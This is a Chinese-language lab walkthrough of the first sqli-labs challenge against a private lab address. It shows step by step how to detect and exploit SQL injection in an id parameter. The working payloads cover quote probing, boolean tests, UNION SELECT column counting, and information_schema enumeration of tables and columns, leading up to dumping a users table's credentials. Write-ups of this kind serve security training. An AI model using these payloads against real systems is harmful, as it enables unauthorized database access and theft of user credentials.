# Basic Challenges

## 第一关

![image-20220115150656786](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115150656786.png)

通过输入

```
http://172.16.12.96:86/Less-1/?id=1
```

将id作为变量输入

![image-20220115150904205](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115150904205.png)

输入单引号闭合查看

```
http://172.16.12.96:86/Less-1/?id=1'
```

![image-20220115150944804](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115150944804.png)

可以看出有个LIMIT语句从第0个数据开始取，取出一个数据

数据库是Mysql数据库

利用

```sql
'and '1'='1
'and '1'='2
```

判断注入

![image-20220115151251846](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115151251846.png)

![image-20220115151302785](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115151302785.png)

存在SQL注入漏洞

查看返回值数量

```sql
'+union+select+null,+null,+null--+
```

![image-20220115151637831](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115151637831.png)当使用上述语句时，返回值正常，返回三个值

继续猜解，判断三个返回值的数据类型，发现未报错但并不显示。

上网查询学习到

==虽然数据进行了正常的返回，但因为有Limit的限制，选取了第一个数值所以后面信息并没有显示出，需要查询一个并不存在的值，使id查询为空==

```sql
' union select 'a', 'l', 'a'--+
```

![image-20220115153500041](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115153500041.png)

第二和第三的是返回字符类型

构造语句查询information_schema.tables试试

```sql
' union select null, table_name, null from information_schema.tables--+
```

![image-20220115181418647](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115181418647.png)

由此可见对输出的内容有个数限制，故用group_concat函数，但group_concat函数在Mysql中有group_concat_max_len的长度限制。如果想通过一个group_concat一次显示所有表名是不可能的，故添加限制。

```sql
' union select null, group_concat('---',table_name), null from information_schema.tables where table_name like '%user%'
```

![image-20220115182129289](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115182129289.png)

运气好看到有users表

```sql
' union select null, group_concat('---',column_name), null from information_schema.columns where table_name='users'--+
```

![image-20220115182300740](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115182300740.png)

对用户名和密码select即可